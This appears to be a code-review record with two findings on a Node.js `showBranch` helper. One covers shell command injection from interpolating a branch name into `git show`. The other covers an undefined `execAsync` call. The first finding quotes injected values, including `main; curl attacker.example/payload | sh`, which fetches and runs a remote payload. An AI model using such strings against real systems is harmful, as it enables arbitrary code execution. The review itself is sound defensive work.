findings.title: [P1] Reintroduce argument-array invocation to prevent shell command injection
findings.body: The new code interpolates `branch` directly into a shell command string (`const command = \`git show ${branch}\``) and executes it through a shell-running `exec`-style API, whereas the removed code passed `branch` as a single literal argument to `git` with no shell interpretation. Any caller-supplied value containing shell metacharacters — e.g. `main; curl attacker.example/payload | sh` or `topic$(command)` — now executes arbitrary commands with the process's privileges, and can also hang the returned promise with injected long-running children (`HEAD; sleep 300`). `showBranch`'s contract (a free-form `branch: string`) is unchanged, so this bites under realistic inputs. Keep the parameter out of the shell: `return execFileAsync("git", ["show", branch]);`

findings.title: [P1] Replace undefined `execAsync` with a real import/helper
findings.body: The added line calls `execAsync(command)`, but no binding named `execAsync` exists in module scope: line 13 imports only `execFile` from `node:child_process` (and `execAsync` is not a Node builtin export), there is no local definition, and a repository-wide search finds no other module that could define it. Every invocation of `showBranch` therefore throws `ReferenceError: execAsync is not defined`, and the file fails to typecheck (TS2304) as the repo stands. If the intent was to switch to shell `exec`, it still needs a real promisified helper; otherwise restore the previous `execFileAsync` call.
